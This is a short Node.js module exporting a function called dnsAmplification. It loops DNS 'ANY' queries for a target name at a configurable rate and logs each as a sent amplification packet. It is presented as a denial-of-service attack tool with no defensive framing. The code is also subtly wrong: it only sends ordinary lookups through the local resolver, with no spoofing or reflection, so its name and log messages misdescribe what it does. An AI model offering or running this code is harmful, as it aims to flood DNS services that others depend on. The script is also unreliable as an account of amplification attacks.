const dns = require('dns');

function dnsAmplification(target, rateLimit) {
    setInterval(() => {
        dns.resolve(target, 'ANY', (err, addresses) => {
            if (err) {
                console.error('Error: ' + err.message);
            } else {
                console.log('Sent DNS amplification packet');
            }
        });
    }, 1000 / rateLimit);
}

module.exports = dnsAmplification;
